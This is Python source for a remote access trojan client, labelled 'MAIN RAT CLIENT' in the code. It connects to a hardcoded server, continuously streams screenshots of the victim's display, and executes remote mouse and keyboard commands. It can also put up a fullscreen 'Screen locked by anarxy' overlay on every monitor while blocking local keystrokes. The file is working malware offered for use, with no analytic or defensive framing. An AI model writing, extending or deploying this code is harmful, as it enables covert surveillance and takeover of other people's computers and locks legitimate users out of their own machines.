import socket
import mss
import cv2
import numpy as np
import pickle
import struct
import threading
import tkinter as tk
from PIL import Image, ImageTk
import platform
import ctypes
import requests
from io import BytesIO
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Listener as KeyboardListener, Key as PynKey
from pynput.keyboard import Controller as KeyboardController

server_ip = '192.168.1.248'
server_port = 9999

mouse = MouseController()
keyboard = KeyboardController()

keymap = {
    "BACKSPACE": PynKey.backspace,
    "ENTER": PynKey.enter,
    "SPACE": PynKey.space,
    "TAB": PynKey.tab,
    "ESC": PynKey.esc,
    "SHIFT": PynKey.shift,
    "CTRL": PynKey.ctrl,
    "ALT": PynKey.alt,
    "CAPSLOCK": PynKey.caps_lock,
    "DELETE": PynKey.delete,
    "UP": PynKey.up,
    "DOWN": PynKey.down,
    "LEFT": PynKey.left,
    "RIGHT": PynKey.right
}

# For side buttons (Windows)
if platform.system() == "Windows":
    MOUSEEVENTF_XDOWN = 0x0080
    MOUSEEVENTF_XUP = 0x0100
    XBUTTON1 = 0x0001
    XBUTTON2 = 0x0002
    def click_xbutton(xbutton):
        ctypes.windll.user32.mouse_event(MOUSEEVENTF_XDOWN, 0, 0, xbutton, 0)
        ctypes.windll.user32.mouse_event(MOUSEEVENTF_XUP, 0, 0, xbutton, 0)

# === GLOBAL LOCK FLAG ===
locked = False  # When True, we ignore all keyboard input

# === KEYBOARD HOOK ===
def on_press(key):
    global locked
    if locked:
        # Discard ALL keystrokes if locked
        return False  # Tells pynput to ignore this event
    # Otherwise, do nothing special here
    return None

def start_keyboard_hook():
    # This listener discards all key events if locked = True
    with KeyboardListener(on_press=on_press) as listener:
        listener.join()

# Run keyboard hook in background
threading.Thread(target=start_keyboard_hook, daemon=True).start()

# === FULLSCREEN OVERLAYS ===
lock_root = None
lock_overlays = []
lock_img_tk = None

def init_lock_root():
    """Create a hidden Tk root that runs forever in its own thread."""
    global lock_root
    lock_root = tk.Tk()
    lock_root.withdraw()  # Hide the main window
    lock_root.mainloop()

# Start the persistent Tk root in a separate thread
threading.Thread(target=init_lock_root, daemon=True).start()

def show_lock_screen_gui():
    global lock_overlays, lock_img_tk, lock_root

    # Download the image from GitHub
    try:
        res = requests.get("https://github.com/Anarxyfr/fdsa/blob/main/Anarxy.png?raw=true")
        lock_img = Image.open(BytesIO(res.content)).resize((300, 300))
        lock_img_tk = ImageTk.PhotoImage(lock_img)
    except:
        lock_img_tk = None

    # Create an overlay window on each monitor
    with mss.mss() as sct:
        monitors = sct.monitors[1:]  # all monitors except the dummy [0]

    for mon in monitors:
        win = tk.Toplevel(lock_root)
        win.overrideredirect(True)  # remove window borders
        win.geometry(f"{mon['width']}x{mon['height']}+{mon['left']}+{mon['top']}")
        win.configure(bg="black")
        win.attributes("-topmost", True)

        canvas = tk.Canvas(win, bg="black", highlightthickness=0)
        canvas.pack(fill="both", expand=True)

        # SHIFT TEXT UP A BIT
        text_y = mon["height"] // 3  # or adjust to taste
        canvas.create_text(
            mon["width"] // 2, text_y,
            text="Screen locked by anarxy",
            fill="white",
            font=("Arial", 48)
        )

        # SHIFT IMAGE DOWN
        image_y = (mon["height"] // 2) + 50  # move image further down if you like
        if lock_img_tk:
            canvas.create_image(mon["width"] // 2, image_y, image=lock_img_tk)
        else:
            canvas.create_text(mon["width"] // 2, image_y, text="[Image not available]", fill="red", font=("Arial", 24))

        lock_overlays.append(win)

def hide_lock_screen_gui():
    global lock_overlays
    for win in lock_overlays:
        try:
            win.destroy()
        except:
            pass
    lock_overlays.clear()

def lock_screen():
    global locked
    locked = True  # This triggers keyboard blocking in on_press
    if lock_root:
        lock_root.after(0, show_lock_screen_gui)

def unlock_screen():
    global locked
    locked = False
    if lock_root:
        lock_root.after(0, hide_lock_screen_gui)

# === MAIN RAT CLIENT ===
s = socket.socket()
s.connect((server_ip, server_port))

import mss
monitor_capture = mss.mss()

mon_info = monitor_capture.monitors[1]
width = mon_info["width"]
height = mon_info["height"]

while True:
    # Capture screen
    img = np.array(monitor_capture.grab(mon_info))
    frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
    _, encimg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
    data = pickle.dumps((encimg, width, height))
    s.sendall(struct.pack(">L", len(data)) + data)

    # Check commands
    s.settimeout(0.01)
    try:
        raw = s.recv(4, socket.MSG_PEEK)
        if raw:
            cmd_size = struct.unpack(">L", s.recv(4))[0]
            cmd_data = b''
            while len(cmd_data) < cmd_size:
                cmd_data += s.recv(cmd_size - len(cmd_data))
            cmd = cmd_data.decode()
            parts = cmd.split(":")

            if parts[0] == "MOVE":
                x, y = int(parts[1]), int(parts[2])
                mouse.position = (x, y)

            elif parts[0] == "CLICK":
                if parts[1] == "LEFT":
                    mouse.click(Button.left)
                elif parts[1] == "RIGHT":
                    mouse.click(Button.right)

            elif parts[0] == "SCROLL":
                mouse.scroll(0, int(parts[1]))

            elif parts[0] == "XBUTTON":
                if parts[1] == "1":
                    click_xbutton(XBUTTON1)
                elif parts[1] == "2":
                    click_xbutton(XBUTTON2)

            elif parts[0] == "KEY":
                # Only handle keystrokes if not locked
                if not locked:
                    key = parts[1]
                    try:
                        if key.upper() in keymap:
                            target_key = keymap[key.upper()]
                        else:
                            target_key = key.lower()
                        keyboard.press(target_key)
                        keyboard.release(target_key)
                    except Exception as e:
                        print(f"[!] Key error: {e}")

            elif parts[0] == "LOCKSCREEN":
                print("[*] Lock screen triggered.")
                lock_screen()

            elif parts[0] == "UNLOCKSCREEN":
                print("[*] Unlock screen triggered.")
                unlock_screen()

    except socket.timeout:
        pass
